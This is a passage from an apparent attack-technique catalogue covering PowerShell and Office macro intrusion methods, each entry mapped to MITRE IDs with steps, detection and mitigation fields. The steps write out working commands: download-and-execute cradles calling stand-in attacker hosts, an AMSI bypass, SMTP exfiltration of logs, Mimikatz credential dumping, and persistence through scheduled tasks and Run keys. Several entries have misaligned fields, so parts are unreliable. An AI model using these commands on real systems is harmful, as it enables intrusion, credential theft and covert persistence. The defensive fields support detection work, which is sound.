- **MITRE**: T1059.001 – PowerShell Access
- **Impact**: Remote C2, full system control
- **Tools**: Empire, PowerShell, Stager URL
- **Scenario**: Launches a staged Empire agent using Base64 encoded PowerShell command on target host.
- **Attack Steps**: 1. Generate PowerShell launcher via Empire.2. Encode to Base64, e.g.: powershell -enc <base64>.3. Drop or execute locally via admin session.4. Beacon connects to Empire C2.5. Agent persists via registry or scheduled task.
- **Detection**: AMSI bypass alerts, command-line profiling
- **Solution**: Enforce Constrained Language Mode
- **Tags**: #EmpireBeacon #PSBase64 #PSType1 #MITRE_T1059_001

## PowerShell WMI Recon & Execution

- **Attack Type**: Recon via WMI + Execution
- **Target**: Windows Enterprise
- **Vulnerability**: WMI access without monitoring
- **MITRE**: T1047 – WMI Execution
- **Impact**: Remote hack and lateral movement
- **Tools**: PowerShell, WMI, Invoke-WmiMethod
- **Scenario**: Uses PowerShell and WMI to collect system info then executes payload on remote host.
- **Attack Steps**: 1. Run: Get-WmiObject Win32_ComputerSystem.2. Enumerate processes, users, network adapters.3. Use Invoke-WmiMethod to copy and run payload on remote host.4. Execute remote process under WMI context.5. Clean up downloads.
- **Detection**: WMI event monitoring, file download alerts
- **Solution**: Monitor WMI use, restrict remote execution via WMI
- **Tags**: #PSWMI #RemoteExec #PSScripting #MITRE_T1047

## PowerShell WebDAV Script Downloader

- **Attack Type**: Web-Based Script Download
- **Target**: iex"`.3. Script runs stealthily in memory.4. Performs reconnaissance or C2.
- **Vulnerability**: Any Windows Host
- **MITRE**: Script execution via URL not blocked
- **Impact**: T1105 – Ingress Tool Transfer
- **Tools**: PowerShell, WebDAV URL, ScriptBlock
- **Scenario**: Downloads and executes PowerShell script via WebDAV to perform post-exploit tasks.
- **Attack Steps**: 1. Host .ps1 script on WebDAV server.2. Execute: `powershell -NoProfile -Exec Bypass -Command "(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
- **Detection**: In-memory malware execution
- **Solution**: HTTP logs, proxy monitoring, script loader detection
- **Tags**: Block web-based script invocation, limit Internet-facing PowerShell commands

## PowerShell Encoded One-Liner via Scheduled Task

- **Attack Type**: Persistence + Encoded Execution
- **Target**: Domain-Joined PCs
- **Vulnerability**: Scheduled tasks trusted, base64 obfuscation
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Persistent remote execution
- **Tools**: schtasks.exe, PowerShell
- **Scenario**: Uses scheduled task to run Base64 encoded PowerShell one-liner at startup.
- **Attack Steps**: 1. Create scheduled task: schtasks /create /sc onlogon /tn "SysUpdate" /tr "powershell -Enc <payload>".2. Payload executes at user logon.3. Connects to C2 or deploys agent.4. Can drop files or tools.
- **Detection**: Scheduled task logging, task creation alerts
- **Solution**: Restrict creation of scheduled tasks via GPO
- **Tags**: #PSEncodedTask #PSPersistence #MITRE_T1053_005

## PowerShell Downgrade Attack via GPO Enforcement

- **Attack Type**: Policy Manipulation
- **Target**: Domain Admin Hosts
- **Vulnerability**: Policy enforcement bypassable
- **MITRE**: T1569.002 – PowerShell Policy Modification
- **Impact**: Enables full PS exploitation
- **Tools**: Group Policy cmdlets, PowerShell Profile
- **Scenario**: Modifies PowerShell execution policies via GPO to allow unrestricted execution.
- **Attack Steps**: 1. Use Set-ExecutionPolicy Unrestricted -Scope LocalMachine.2. Or modify GPO registry key directly via New-ItemProperty.3. Remove ConstrainedLanguage configuration.4. Upload then execute malicious scripts.5. Restore settings after access.
- **Detection**: Monitor GPO changes, registry policy keys
- **Solution**: Enforce Admin oversight, monitor PS policy modifications
- **Tags**: #PSPolicyBypass #GPOPersistence #MITRE_T1569_002

## PowerShell Forensics Data Exfil via SMTP

- **Attack Type**: Data Exfiltration via Email
- **Target**: Endpoint Systems
- **Vulnerability**: Scripts have SMTP access
- **MITRE**: T1041 – Exfil via Email
- **Impact**: Logs or PII exfiltration
- **Tools**: PowerShell, Compress-Archive, Send-MailMessage
- **Scenario**: Uses PowerShell to collect event logs, compress and email to attacker via SMTP.
- **Attack Steps**: 1. Collect logs: Get-EventLog -LogName Security.2. Compress: Compress-Archive -Path events.evtx -Destination logs.zip.3. Email: Send-MailMessage -SmtpServer smtp.attacker.com -To me@evil -From pc@victim -Attachments logs.zip.4. Logs sent out stealthily.
- **Detection**: SMTP logs, archive creation logs
- **Solution**: Block unusual email traffic from endpoints
- **Tags**: #PSLogExfil #SendMail #MITRE_T1041

## Fileless PowerShell Reflective DLL Injection

- **Attack Type**: Reflective DLL via PSReflect
- **Target**: High-Privilege Host
- **Vulnerability**: In-memory execution via PowerShell
- **MITRE**: T1055.001 – Process Injection
- **Impact**: Credential access, memory-resident tool usage
- **Tools**: PowerSploit, PowerShell, Reflective DLL
- **Scenario**: Uses PowerSploit’s Invoke-ReflectivePEInjection to load payload DLL entirely in memory.
- **Attack Steps**: 1. Run Invoke-ReflectivePEInjection -PEPath .\mimikatz.dll -ProcessId [PID].2. DLL is injected into target process.3. No on-disk file dropped.4. Evades AV and detection.
- **Detection**: Process memory scanning, DLL injection alerts
- **Solution**: Block reflective DLL usage, allow PS constrained modes
- **Tags**: #PSReflectiveDLL #MemoryOnly #MITRE_T1055_001

## AMSI Bypass Using Reflection Methods

- **Attack Type**: AMSI Memory Patch
- **Target**: Defender-Enabled Host
- **Vulnerability**: AMSI bypasses not properly blocked
- **MITRE**: T1562.001 – Defense Evasion
- **Impact**: Disables script detection
- **Tools**: PowerShell, AMSI bypass script
- **Scenario**: PowerShell script disables AMSI scan by modifying AMSI DLL memory.
- **Attack Steps**: 1. Run: [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)2. AMSI fails to scan further commands.3. Load malicious modules or payloads without detection.
- **Detection**: Memory inspection, AMSI error detection
- **Solution**: Enable WDAC, block reflection techniques
- **Tags**: #AMSIBypass #ReflectionAttack #MITRE_T1562_001

## PowerShell Command Hidden in Alternate Data Stream (ADS)

- **Attack Type**: ADS-based Stealth Payload
- **Target**: iex}"`.3. Payload runs invisibly.4. Evades standard file monitoring.
- **Vulnerability**: NTFS Systems
- **MITRE**: ADS streams unchecked
- **Impact**: T1564.004 – Hide via ADS
- **Tools**: ADS, PowerShell
- **Scenario**: Stores script in hidden NTFS ADS and executes it via PowerShell.
- **Attack Steps**: 1. Save payload to alternate stream: echo payload > file.txt:hidden.ps1.2. Execute using: `powershell -exec bypass -command "& {Get-Content .\file.txt:hidden.ps1
- **Detection**: Stealth execution from hidden script
- **Solution**: Monitor NTFS ADS access, process spawn tracking
- **Tags**: Block ADS execution or monitor file IOCs

## Invoke-Mimikatz to Dump Credentials

- **Attack Type**: Credential Dumping using PowerShell
- **Target**: Domain Systems
- **Vulnerability**: LSASS access without AV prevention
- **MITRE**: T1003.001 – LSASS Memory Dump
- **Impact**: Full credential exposure
- **Tools**: PowerShell, Invoke-Mimikatz.ps1
- **Scenario**: Loads Mimikatz into memory and extracts credentials.
- **Attack Steps**: 1. Load Mimikatz script in memory: IEX (New-Object Net.WebClient).DownloadString('http://x/Invoke-Mimikatz.ps1').2. Run: Invoke-Mimikatz.3. Dump cleartext creds, hashes, Kerberos tickets.4. Use for lateral movement or persistence.
- **Detection**: Credential Guard alerts, LSASS access logs
- **Solution**: Use LSASS protection, restrict PowerShell debugging
- **Tags**: #InvokeMimikatz #PowerShellCredentialDump #MITRE_T1003_001

## PowerShell Download Cradle Obfuscation

- **Attack Type**: String Obfuscation of Web Downloader
- **Target**: Windows Users
- **Vulnerability**: AV bypass via obfuscation
- **MITRE**: T1027 – Obfuscated Files/Scripts
- **Impact**: Bypasses string-based detection engines
- **Tools**: PowerShell, Invoke-Obfuscation
- **Scenario**: Obfuscates iex and URLs in PowerShell to avoid detection.
- **Attack Steps**: 1. Use: "I+"EX" to build iex at runtime.2. Split URL string across multiple variables.3. Combine and execute: $cmd = $a+$b+$c; iex $cmd.4. Downloads and executes script without static indicators.
- **Detection**: Detect dynamic eval, block encoded/obfuscated strings
- **Solution**: Deep scan script content, restrict use of iex
- **Tags**: #DownloadCradle #ObfuscatedPS #MITRE_T1027

## PowerShell Execution via Macro-Triggered Script

- **Attack Type**: Office Macro Executes PowerShell
- **Target**: Office Clients
- **Vulnerability**: Macros + unrestricted PS execution
- **MITRE**: T1059.005 – Office Macros + PowerShell
- **Impact**: Malware deployment via Office document
- **Tools**: Word, VBA, PowerShell
- **Scenario**: Macro in Office document triggers PowerShell to download and execute payload.
- **Attack Steps**: 1. Embed VBA macro with code: Shell "powershell -exec bypass -nop -window hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x')"2. User enables macro.3. PowerShell runs, payload executed.4. Persistence or beacon established.
- **Detection**: Office macro usage logs, PowerShell process tree
- **Solution**: Block macros, restrict PS via GPO policies
- **Tags**: #OfficeMacroPowerShell #MacroDelivery #MITRE_T1059_005

## PowerShell Reverse Shell via Encrypted HTTPS Channel

- **Attack Type**: Encrypted Channel Reverse Shell
- **Target**: Workstations
- **Vulnerability**: HTTPS exfil not filtered
- **MITRE**: T1573 – Encrypted Channel
- **Impact**: Stealthy remote control
- **Tools**: PowerShell, Ngrok, Netcat
- **Scenario**: Establishes reverse shell via PowerShell over HTTPS to avoid detection.
- **Attack Steps**: 1. Use PS to run: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://ngrok.io/shell.ps1').2. Shell script connects back to Ngrok tunnel.3. Uses port forwarding to attacker machine.4. Shell encrypted in transit, harder to trace.
- **Detection**: Encrypted DNS/HTTPS traffic anomalies
- **Solution**: Block external HTTPS PS downloads, alert on reverse shells
- **Tags**: #PowerShellHTTPS #ReverseShell #MITRE_T1573

## PowerShell Script Scheduled via Registry Run Key

- **Attack Type**: Registry-Based Persistence
- **Target**: User Workstations
- **Vulnerability**: Registry autorun keys not locked
- **MITRE**: T1547.001 – Registry Run Keys
- **Impact**: Long-term persistence without detection
- **Tools**: Registry, PowerShell
- **Scenario**: Stores PowerShell payload in HKCU\Software\Microsoft\Windows\CurrentVersion\Run for autorun.
- **Attack Steps**: 1. Write: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysHelper' -Value 'powershell -nop -w hidden -c IEX(...)'2. Executes at each login.3. Attacker regains access each boot.
- **Detection**: Monitor autorun key changes, registry watcher tools
- **Solution**: Lock Run keys via policy, use endpoint autorun monitors
- **Tags**: #RegistryPersistence #PowerShellRunKey #MITRE_T1547_001

## AutoOpen VBA Macro (Document_Open Trigger)

- **Attack Type**: Auto Execution via AutoOpen
- **Target**: Office Users
- **Vulnerability**: Execution triggered automatically without prompt
- **MITRE**: T1059.005 – Office Macros
- **Impact**: Code runs as soon as document opens
- **Tools**: Word, VBA Editor
- **Scenario**: Embeds VBA in Document_Open event that executes on opening the file.
- **Attack Steps**: 1. Open Word → Press Alt + F11 to access VBA editor. 2. Insert code into ThisDocument → Document_Open() event. 3. Code executes automatically when document is opened. 4. Payload may download malware or open reverse shell. 5. Save as .docm or change extension to .doc to avoid suspicion.
- **Detection**: Monitor macro-triggered executions
- **Solution**: Disable macros via GPO; use Protected View
- **Tags**: #AutoOpen #OfficeMacro #Document_Open

## Template Injection via Remote DOTM File

- **Attack Type**: Remote Template with Macro
- **Target**: Enterprise Users
- **Vulnerability**: Remote templates allowed by default
- **MITRE**: T1195.003 – Template Injection
- **Impact**: Payload from remote source can execute silently
- **Tools**: Word, DOTM template, Web Server
- **Scenario**: Word loads external template that includes macros.
- **Attack Steps**: 1. Host a malicious .dotm template containing macro on a web server. 2. Create a .docx or .doc that references this template via "Developer → Document Template → URL". 3. When the user opens the document, Word fetches the remote template. 4. Macros in the template execute on the victim’s machine. 5. Payload runs (e.g., reverse shell, downloader).
- **Detection**: Monitor template fetches; block external URLs
- **Solution**: Disable remote templates in Office settings
- **Tags**: #RemoteTemplate #DOTM #MacroAttack

## Excel 4.0 Macro (XLM) Execution

- **Attack Type**: Legacy Macro Feature Exploitation
- **Target**: Excel Users
- **Vulnerability**: XLM macro support still enabled in Excel
- **MITRE**: T1059.005 – Office Macros
- **Impact**: Executes code bypassing VBA restrictions
- **Tools**: Excel, .xls, XLM editor
- **Scenario**: Uses Excel’s legacy XLM macros for code execution.
- **Attack Steps**: 1. Open Excel and enable Developer tab. 2. Insert a new macro sheet. 3. Write formula: =EXEC("powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')") 4. Save file as .xls. 5. When victim opens the file, Excel auto-runs the macro without VBA. 6. PowerShell payload executes in background.
- **Detection**: Detect use of XLM macro sheets
- **Solution**: Disable XLM macro support in GPO
- **Tags**: #XLM #ExcelMacro #LegacyExecution

## DDE Attack in Excel

- **Attack Type**: Dynamic Data Exchange (DDE) Exploit
- **Target**: /C powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString("http://mal.site")'!A1`. 2. When user opens file, Excel prompts to enable updates. 3. Upon accepting, PowerShell command executes silently. 4. Payload fetched and run.
- **Vulnerability**: Office Users
- **MITRE**: DDE allowed in Excel without sandbox
- **Impact**: T1218.010 – DDE Injection
- **Tools**: Excel, PowerShell
- **Scenario**: Executes shell command via Excel cell using DDE formula.
- **Attack Steps**: 1. In Excel cell, enter formula like `=cmd
- **Detection**: Payload execution without macro or VBA
- **Solution**: Monitor DDE activity and event prompts
- **Tags**: Disable DDE functionality in Office

## VBA Macro via FileSystemObject

- **Attack Type**: File Write + Shell Execution
- **Target**: General Users
- **Vulnerability**: FileSystemObject not restricted
- **MITRE**: T1059.001 – Command and Scripting Interpreter
- **Impact**: Writes & runs external script
- **Tools**: VBA, Scripting.FileSystemObject
- **Scenario**: VBA writes PowerShell script to disk and executes it.
- **Attack Steps**: 1. In VBA, use CreateObject("Scripting.FileSystemObject"). 2. Write PowerShell code to a .ps1 file on disk. 3. Use Shell("powershell -ExecutionPolicy Bypass -File C:\path\script.ps1") to run. 4. The .ps1 can download and execute malware.
- **Detection**: Monitor file creation + script execution
- **Solution**: Block FSO in macros; use AppLocker
- **Tags**: #FSO #PowerShellWrite #VBA

## Regsvr32 Macro Loader

- **Attack Type**: Living-off-the-land Binary (LOLBAS)
- **Target**: Windows Users
- **Vulnerability**: Trusted binary executes malicious code
- **MITRE**: T1218.010 – Regsvr32 Execution
- **Impact**: No payload dropped to disk
- **Tools**: VBA, regsvr32, Scriptlet
- **Scenario**: Uses regsvr32.exe to load remote .sct file using macro.
- **Attack Steps**: 1. In macro: Shell("regsvr32 /s /n /u /i:http://mal.site/file.sct scrobj.dll") 2. Loads and executes remote .sct script. 3. Scriptlet runs PowerShell commands. 4. Malware downloaded and launched in-memory. 5. All executed via trusted Windows binary.
- **Detection**: Monitor regsvr32 network usage
- **Solution**: Block scriptlet loading via GPO
- **Tags**: #Regsvr32 #LOLBAS #SCTMacro

## Macro Dropping ADS Payload

- **Attack Type**: Alternate Data Stream (ADS) Abuse
- **Target**: Invoke-Expression`. 3. No visible file created on disk. 4. Execution occurs completely from alternate stream.
- **Vulnerability**: Endpoints
- **MITRE**: ADS not monitored by traditional AV
- **Impact**: T1564.004 – Hidden File Execution
- **Tools**: VBA, PowerShell, NTFS
- **Scenario**: Macro writes and executes script in ADS to evade AV.
- **Attack Steps**: 1. Macro writes PowerShell payload into C:\temp\file.txt:hidden.ps1. 2. Then executes with: `powershell -ExecutionPolicy Bypass -Command Get-Content C:\temp\file.txt:hidden.ps1
- **Detection**: Avoids detection by using hidden data streams
- **Solution**: Monitor ADS creation & PowerShell reads
- **Tags**: Restrict NTFS ADS usage

## VBA Macro + CertUtil Downloader

- **Attack Type**: Trusted Binary Abuse
- **Target**: Corporate Endpoints
- **Vulnerability**: certutil allowed as trusted tool
- **MITRE**: T1218.010 – Signed Binary Execution
- **Impact**: File downloaded under AV radar
- **Tools**: VBA, certutil.exe
- **Scenario**: Uses certutil.exe in macro to download and execute file.
- **Attack Steps**: 1. Macro command: Shell("certutil -urlcache -split -f http://malicious.site/file.exe payload.exe"). 2. Executes payload via Shell("payload.exe"). 3. Since certutil is signed Microsoft binary, it may bypass AV.
- **Detection**: Monitor certutil calls; restrict usage
- **Solution**: Disable certutil for non-admin users
- **Tags**: #Certutil #DownloaderMacro #LivingOffTheLand

## Excel Macro via Hidden Cell Logic

- **Attack Type**: Logic-Based Execution
- **Target**: Spreadsheet Users
- **Vulnerability**: Hidden cell data not scanned
- **MITRE**: T1027 – Obfuscated Files or Info
- **Impact**: Execution tied to hidden, overlooked content
- **Tools**: Excel, VBA
- **Scenario**: Formula hides malicious code in cells that is triggered programmatically.
- **Attack Steps**: 1. Macro references data from hidden cells (e.g., base64 encoded PowerShell). 2. On button click or Workbook_Open, it decodes & executes. 3. Obfuscates payload from basic analysis tools and AV.
- **Detection**: Enable full-cell content scans
- **Solution**: Audit cell dependencies in spreadsheet
- **Tags**: #HiddenLogic #MacroObfuscation #ExcelPayload

## Macro using WMI via PowerShell

- **Attack Type**: WMI for Stealth Execution
- **Target**: Windows Machines
- **Vulnerability**: WMI not linked to Office process tree
- **MITRE**: T1047 – WMI Execution
- **Impact**: Process launched invisibly from Office macro
- **Tools**: VBA, WMI, PowerShell
- **Scenario**: Macro spawns PowerShell via WMI method to avoid process tree linkage.
- **Attack Steps**: 1. Macro code: Set objWMI = GetObject("winmgmts:root\cimv2")2. Use objWMI.Get("Win32_Process").Create("powershell -nop -w hidden ...") 3. Executes without linking directly to Word or Excel processes. 4. Payload remains hidden from parent-child trees.
- **Detection**: Enable WMI auditing + command-line logging
- **Solution**: Block macro→WMI process launches
- **Tags**: #WMI #StealthExec #MacroEvadeAV

## Word Macro Trigger via ActiveX Controls

- **Attack Type**: ActiveX Shell Execution
- **Target**: Word Users
- **Vulnerability**: ActiveX objects allowed in Office by default
- **MITRE**: T1059.005 – Office Macros
- **Impact**: Trusted scripting object runs OS command
- **Tools**: VBA, ActiveX
- **Scenario**: Uses WScript.Shell ActiveX object to run OS commands from Word.
- **Attack Steps**: 1. In macro: Set shell = CreateObject("WScript.Shell") 2. Run: shell.Run "cmd.exe /c powershell ...", possibly hidden. 3. Can be used to launch scripts, binaries, or even scheduled tasks. 4. ActiveX bypasses macro policy when embedded.
- **Detection**: Detect ActiveX usage in VBA
- **Solution**: Block Office ActiveX object creation
- **Tags**: #ActiveX #ShellRun #MacroExecution

## Multi-Stage VBA Payload Delivery via Pastebin

- **Attack Type**: Multi-Stage Payload Delivery
- **Target**: Enterprise Users
- **Vulnerability**: Dynamic macro content bypasses scanners
- **MITRE**: T1027 – Obfuscated Delivery
- **Impact**: Dynamic loading avoids detection & sandboxing
- **Tools**: VBA, Pastebin, PowerShell
- **Scenario**: Macro loads second stage from Pastebin or GitHub at runtime.
- **Attack Steps**: 1. Initial macro is minimal, fetches command from Pastebin via PowerShell web request. 2. IEX (New-Object Net.WebClient).DownloadString("pastebin.com/raw/xxx") 3. Second stage runs, includes loader or beacon. 4. Avoids static signature detection.
- **Detection**: Block Office access to pastebin-like sites
- **Solution**: Monitor PowerShell network calls from Office
- **Tags**: #MultiStage #PastebinPayload #DynamicMacro

## Macro Creating Scheduled Task for Persistence

- **Attack Type**: Task Scheduler Abuse
- **Target**: Windows Users
- **Vulnerability**: Task scheduler unrestricted from macro usage
- **MITRE**: T1053.005 – Scheduled Task
- **Impact**: Long-term persistence via scheduled execution
- **Tools**: VBA, schtasks.exe
- **Scenario**: Macro creates a Windows Scheduled Task to launch malware persistently.
- **Attack Steps**: 1. VBA uses: Shell("schtasks /Create /SC DAILY /TN updatetask /TR 'powershell -File C:\mal\payload.ps1' /F") 2. Creates task under user/system context. 3. Payload runs silently at scheduled interval. 4. Persistence is maintained without registry or startup folder usage.
- **Detection**: Audit task creation; detect Office-initiated tasks
- **Solution**: Restrict task creation to admins
- **Tags**: #Persistence #ScheduledTask #MacroTrigger

## VBA Download and Execute via MSXML2.XMLHTTP

- **Attack Type**: Web Request-Based Downloader
- **Target**: Office Users
- **Vulnerability**: External web requests not restricted in macros
- **MITRE**: T1105 – Remote File Copy
- **Impact**: Memory-only execution, minimal footprint
- **Tools**: VBA, MSXML2.XMLHTTP, PowerShell
- **Scenario**: Macro uses MSXML2.XMLHTTP to fetch remote script and execute in memory.
- **Attack Steps**: 1. Macro uses Set req = CreateObject("MSXML2.XMLHTTP") to connect to http://attacker.com/payload.ps1 2. Reads response, executes with PowerShell’s Invoke-Expression. 3. Entire execution happens in memory. 4. Leaves no obvious disk traces.
- **Detection**: Disable Office HTTP calls; use proxy inspection
- **Solution**: Monitor PowerShell child processes
- **Tags**: #XMLHTTP #MemoryExecution #DownloaderMacro

## Macro-Based Credential Harvesting Prompt

- **Attack Type**: Fake Credential Prompt
- **Target**: Office Users
- **Vulnerability**: User trust in GUI prompts
- **MITRE**: T1056.004 – Credential Prompt
- **Impact**: Harvests credentials without malware
- **Tools**: VBA, InputBox, MSForms
- **Scenario**: Uses InputBox or GUI to trick user into entering credentials.
- **Attack Steps**: 1. Macro shows prompt: InputBox("Your session expired. Please re-enter credentials.") 2. Captures input and stores to hidden file or variable. 3. Optionally sends data over HTTP or logs locally. 4. Mimics Windows or corporate login messages.
- **Detection**: Monitor macros with GUI interaction prompts
- **Solution**: User education; block macros showing prompt dialogs
- **Tags**: #PhishingPrompt #CredentialHarvest #InputBox

## VBA Macro Triggering DLL via Rundll32

- **Attack Type**: DLL Execution via Rundll32
- **Target**: Enterprise Users
- **Vulnerability**: DLL execution via trusted system binary
- **MITRE**: T1218.011 – Rundll32
- **Impact**: Stealthy DLL execution using trusted tool
- **Tools**: VBA, DLL, rundll32.exe
- **Scenario**: Macro uses Windows’ rundll32.exe to execute a malicious DLL silently.
- **Attack Steps**: 1. Macro drops a malicious DLL to disk (e.g., payload.dll).2. Uses Shell("rundll32.exe payload.dll,EntryPoint") to execute.3. DLL contains encoded shellcode or backdoor.4. Bypasses many AV engines due to trusted binary.5. Execution appears as benign rundll32 process in logs.
- **Detection**: Monitor rundll32 launching non-system DLLs
- **Solution**: Block unauthorized DLL execution via policies
- **Tags**: #Rundll32 #DLLExecution #MacroAbuse

## Macro with Obfuscated String Assembly

- **Attack Type**: String Obfuscation for AV Evasion
- **Target**: General Users
- **Vulnerability**: Obfuscated strings bypass static analysis
- **MITRE**: T1027 – Obfuscated Files/Scripts
- **Impact**: Malware bypasses AV and executes silently
- **Tools**: VBA, Base64, PowerShell
- **Scenario**: Macro uses variable concatenation and encoding to evade detection.
- **Attack Steps**: 1. Encodes PowerShell payload in Base64 and splits it across variables.2. Reassembles at runtime: payload = part1 & part2 & ...3. Executes with: Shell("powershell -EncodedCommand " & payload)4. Static AV engines fail to detect real payload due to obfuscation.5. May use string reversal, hex or XOR encoding.
- **Detection**: Dynamic code analysis; heuristic string checks
- **Solution**: Enforce macro behavior restrictions
- **Tags**: #Obfuscation #StringSplit #MacroEvasion

## Macro Trigger via Embedded Object Activation

- **Attack Type**: Embedded Object Exploitation
- **Target**: Office Users
- **Vulnerability**: Trust in embedded content
- **MITRE**: T1204 – User Execution
- **Impact**: Code execution via user interaction
- **Tools**: VBA, OLE, Embedded Script File
- **Scenario**: Macro is triggered when user interacts with embedded object in Word/Excel.
- **Attack Steps**: 1. Embed object (e.g., .txt or .hta) in Office doc via "Insert → Object".2. Use VBA to monitor interaction or auto-trigger upon opening.3. Activates script with: Shell("wscript embedded.hta")4. Can be disguised as form element or icon.5. Payload runs with user-level privileges.
- **Detection**: Block embedded object activation
- **Solution**: Disable active content features
- **Tags**: #EmbeddedObject #MacroTrigger #OLEExploit

## Macro Using Environment Variable Spoofing

- **Attack Type**: Environment Hijack
- **Target**: IT Workstations
- **Vulnerability**: No checks on environment variable sources
- **MITRE**: T1037.001 – Logon Scripts
- **Impact**: Redirection of trusted paths to malicious content
- **Tools**: VBA, PowerShell, Environment Editor
- **Scenario**: Macro modifies AppData or TEMP to launch malicious payloads silently.
- **Attack Steps**: 1. Macro changes environment variable via registry: SetX AppData C:\Malicious2. Places payload in spoofed path.3. Windows or other apps reference fake path during execution.4. Uses Shell("C:\Malicious\tool.exe") to execute.5. Persistence may be achieved if path is reused by other apps.
- **Detection**: Monitor registry/env changes from Office processes
- **Solution**: Lock env variable modification via macro
- **Tags**: #EnvHijack #PathSpoof #MacroRedirection

## Macro Leveraging Certutil XOR Decode Trick

- **Attack Type**: Certutil XOR Decryption
- **Target**: Enterprise Targets
- **Vulnerability**: Certutil allowed to decode arbitrary files
- **MITRE**: T1140 – Deobfuscate/Decode Files
- **Impact**: AV bypass via custom payload encryption
- **Tools**: VBA, certutil.exe, Encoded File
- **Scenario**: Macro uses certutil to decode and run XOR-encrypted payload.
- **Attack Steps**: 1. Macro drops XOR-encoded payload file (e.g., data.enc) to disk.2. Runs certutil -decode data.enc decoded.bin3. Executes decoded file via Shell("decoded.bin")4. Useful when using payloads disguised as certificates.5. Avoids triggering static AV signatures.
- **Detection**: Monitor certutil usage + file decode events
- **Solution**: Disable certutil for standard users
- **Tags**: #XORDecode #Certutil #MacroStealth

## Macro-Driven INF File Dropper

- **Attack Type**: INF File Abuse
- **Target**: Admin Targets
- **Vulnerability**: INF file execution from Office not monitored
- **MITRE**: T1218.011 – Rundll32 Execution
- **Impact**: Payload install bypasses traditional methods
- **Tools**: VBA, INF File, rundll32.exe
- **Scenario**: Macro writes malicious .inf file and executes via rundll32.
- **Attack Steps**: 1. Macro creates .inf file in C:\Temp\payload.inf containing launch directive.2. Executes with: Shell("rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 C:\Temp\payload.inf")3. INF file launches another binary or script.4. Technique used to exploit driver or autorun routines.
- **Detection**: Monitor rundll32 calls with .inf args
- **Solution**: Restrict INF installs via GPO
- **Tags**: #INFDrop #MacroExecution #OfficeINF

## Macro-Based HTML Application (HTA) Execution

- **Attack Type**: HTA Launch via Macro
- **Target**: Business Machines
- **Vulnerability**: mshta.exe not flagged by standard policies
- **MITRE**: T1218.005 – mshta Execution
- **Impact**: Runs code through trusted signed binary
- **Tools**: VBA, mshta.exe, HTA script
- **Scenario**: Macro drops or downloads .hta file and uses mshta.exe to run.
- **Attack Steps**: 1. Macro downloads .hta file via URL or writes it to disk.2. Executes with: Shell("mshta.exe C:\Temp\payload.hta")3. HTA contains VBScript or JScript to execute commands.4. mshta.exe trusted by OS; often ignored by AV.5. HTA may persist in memory.
- **Detection**: Audit mshta usage from Office processes
- **Solution**: Disable HTA execution via registry
- **Tags**: #HTAExecution #mshta #MacroPayload

## Macro Loading Encrypted Script from Image Metadata

- **Attack Type**: Steganography Loader
- **Target**: General Users
- **Vulnerability**: Hidden payload not detectable by scanners
- **MITRE**: T1027.003 – Steganography
- **Impact**: Payload hidden within innocent-looking image
- **Tools**: VBA, EXIFTool, PowerShell
- **Scenario**: Payload hidden in image metadata, extracted by macro and executed.
- **Attack Steps**: 1. Macro downloads image file (e.g., .jpg) with encrypted script in EXIF field.2. Extracts metadata using embedded EXIF commands or VBA parsing.3. Writes content to .ps1 and executes.4. Obfuscates intent and payload source.5. Useful for bypassing URL-based security tools.
- **Detection**: Monitor image downloads + file write patterns
- **Solution**: Block steganographic tools in Office context
- **Tags**: #Stego #ImageMacro #HiddenPayload

## Macro Spoofing Microsoft Update Prompt

- **Attack Type**: User Impersonation via UI
- **Target**: End Users
- **Vulnerability**: High user trust in Microsoft notifications
- **MITRE**: T1056.004 – Credential Prompt
- **Impact**: Credential theft and payload execution
- **Tools**: VBA, MsgBox/InputBox, GUI Tricks
- **Scenario**: Macro presents a fake Microsoft update dialog to get user to enable content or enter info.
- **Attack Steps**: 1. Macro displays message like: MsgBox("Your Office is outdated. Click OK to enable critical update.")2. On click, triggers Shell("powershell -nop -w hidden -c IEX...")3. User may be tricked to trust due to branding.4. May also request credentials using InputBox.
- **Detection**: Train users to detect fake prompts
- **Solution**: Block macros with MsgBox/InputBox usage
- **Tags**: #FakeUpdate #MacroUI #CredentialTrick

## Macro with COM Hijacking for Execution

- **Attack Type**: COM Object Hijack
- **Target**: Advanced Targets
- **Vulnerability**: COM class hijack rarely audited
- **MITRE**: T1546.015 – COM Hijacking
- **Impact**: Payload loaded via system process on restart
- **Tools**: VBA, Registry Editor, DLL
- **Scenario**: Macro registers a malicious COM class and forces application to load it.
- **Attack Steps**: 1. Macro modifies registry key (e.g., HKCU\Software\Classes\CLSID\...) to point to attacker DLL.2. Drops DLL to specified path.3. On reboot or app restart, DLL is loaded.4. Achieves stealthy execution and potential persistence.5. Not commonly monitored if done in user context.
- **Detection**: Monitor COM class changes via registry diffs
- **Solution**: Lock COM class manipulation by non-admins
- **Tags**: #COMHijack #MacroPersistence #RegistryAbuse

## Macro Using Shell.Application for Script Launch

- **Attack Type**: Shell Object Abused for Code Execution
- **Target**: Office Environments
- **Vulnerability**: Shell COM object often not restricted
- **MITRE**: T1218 – Signed Binary Proxy Execution
- **Impact**: Code execution via native Windows object
- **Tools**: VBA, Shell.Application
- **Scenario**: Macro uses Shell.Application COM object to run scripts like .vbs or .js.
- **Attack Steps**: 1. Macro: Set shell = CreateObject("Shell.Application")2. Executes file via: shell.ShellExecute "wscript.exe", "payload.vbs"3. File may be dropped earlier by macro or fetched.4. Payload runs with user-level privileges.5. Often not blocked unless specific controls are enforced.
- **Detection**: Block Shell.Application via Office GPO
- **Solution**: Restrict wscript.exe execution
- **Tags**: #ShellApp #MacroShellExec #COMRun

## Living Off Certutil – Download and Execute

- **Attack Type**: Binary Proxy Execution
- **Target**: Windows Users
- **Vulnerability**: Trust in signed Windows binaries
- **MITRE**: T1218.009 – Signed Binary Proxy Execution
- **Impact**: Download and execution of payload undetected
- **Tools**: certutil.exe, PowerShell, PE File
- **Scenario**: Uses certutil.exe (a trusted Windows binary) to download and run malicious files.
